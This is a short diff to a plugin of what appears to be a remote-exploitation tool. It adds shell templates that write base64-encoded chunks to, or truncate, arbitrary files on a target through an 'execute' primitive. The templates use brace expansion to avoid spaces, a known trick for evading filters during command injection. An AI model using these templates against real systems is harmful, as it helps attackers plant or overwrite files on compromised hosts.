@@ -36,6 +36,11 @@ class Java(Plugin):
                 'call': 'execute',
                 'read': """base64<'{path}'"""
             },
+            'write': {
+                'call': 'execute',
+                'write': """bash -c {{tr,_-,/+}}<<<{chunk_b64}|{{base64,-d}}>>{path}""",
+                'truncate': """bash -c {{echo,-n,}}>{path}""",
+            },
             'md5': {
                 'call': 'execute',
                 'md5': """$(type -p md5 md5sum)<'{path}'|head -c 32"""
